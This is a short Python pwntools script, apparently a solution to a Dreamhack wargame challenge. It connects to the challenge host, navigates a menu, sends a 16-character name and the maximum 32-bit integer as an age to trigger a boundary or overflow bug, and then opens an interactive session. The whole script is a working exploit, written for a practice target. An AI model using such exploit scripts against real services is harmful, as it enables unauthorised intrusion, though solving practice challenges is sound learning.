from pwn import *
context.log_level = 'debug'

hosts = 'host1.dreamhack.games'
port = 24385

p = remote(hosts,port)

NAME = 'A'*16
INT_MAX = 2147483647


p.recvuntil('> ')
p.sendline('3')

p.recvuntil('> ')
p.sendline('1')
p.recvuntil('Name: ')
p.sendline(NAME)
p.recvuntil('Age: ')
p.sendline(str(INT_MAX))

p.recvuntil('> ')
p.sendline('2')


p.interactive()
